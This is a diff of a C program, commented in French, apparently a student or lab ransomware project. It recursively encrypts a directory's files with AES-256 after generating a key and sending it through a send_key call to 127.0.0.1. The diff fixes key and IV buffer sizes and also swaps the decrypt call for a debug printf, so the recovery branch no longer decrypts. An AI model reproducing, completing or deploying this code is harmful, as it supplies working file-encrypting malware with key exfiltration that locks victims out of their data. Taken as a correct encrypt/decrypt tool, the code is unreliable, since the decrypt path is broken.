@@ -45,24 +45,20 @@ int listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fla
 			}
 			else
 			{
-				// Check si le fichier est déjà chiffré
-				if (is_encrypted(entry->d_name) == 0)
+				if (de_flag == 'e')
 				{
-					if (de_flag == 'e')
+					// Chiffre si le fichier ne l'est pas déjà
+					if (is_encrypted(entry->d_name) == 0)
 					{
-						// Chiffre si le fichier ne l'est pas déjà
-						if (is_encrypted(entry->d_name) == 0)
-						{
-							encrypt(key, iv, path);
-						}
+						encrypt(key, iv, path);
 					}
-					else if (de_flag == 'd')
+				}
+				else if (de_flag == 'd')
+				{
+					// Déchiffre si le fichier est chiffré
+					if (is_encrypted(entry->d_name) == 1)
 					{
-						// Déchiffre si le fichier est chiffré
-						if (is_encrypted(entry->d_name) == 1)
-						{
-							decrypt(key, iv, path);
-						}
+						printf("%lu\n", sizeof(iv));
 					}
 				}
 			}
@@ -110,9 +106,9 @@ int main(int argc, char *argv[])
 	// Clé & IV au format binaire
 	unsigned char key[AES_256_KEY_SIZE];
 	unsigned char iv[AES_BLOCK_SIZE];
-	// Clé & IV au format hexadécimal
-	char pKey[AES_256_KEY_SIZE];
-	char pIv[AES_BLOCK_SIZE*2];
+	// Clé & IV au format hexadécimal (2x plus d'espace nécessaire + caractère vide)
+	char pKey[AES_256_KEY_SIZE*2 +1];
+	char pIv[AES_BLOCK_SIZE*2 +1];
 
 	if (argc > 1)
 	{
@@ -126,6 +122,7 @@ int main(int argc, char *argv[])
 			}
 
 			generate_key(key, AES_256_KEY_SIZE, iv, AES_BLOCK_SIZE, pKey, pIv);
+
 			send_key(pKey, pIv, "127.0.0.1");
 
 			listdir(argv[2], iv, key, 'e');
@@ -139,10 +136,10 @@ int main(int argc, char *argv[])
 				return 0;
 			}
 
-			// Check la taille de la clé
+			// Check la taille de la clé (64)
 			if (strlen(argv[2]) == AES_256_KEY_SIZE*2)
 			{
-				hexa_to_bytes(argv[2], key, AES_256_KEY_SIZE*2);
+				hexa_to_bytes(argv[2], key, AES_256_KEY_SIZE);
 			}
 			else
 			{
@@ -150,10 +147,10 @@ int main(int argc, char *argv[])
 				return 0;
 			}
 
-			// Check la taille du vecteur
+			// Check la taille du vecteur (32)
 			if (strlen(argv[3]) == AES_BLOCK_SIZE*2)
 			{
-				hexa_to_bytes(argv[3], iv, AES_BLOCK_SIZE*2);
+				hexa_to_bytes(argv[3], iv, AES_BLOCK_SIZE);
 			}
 			else
 			{
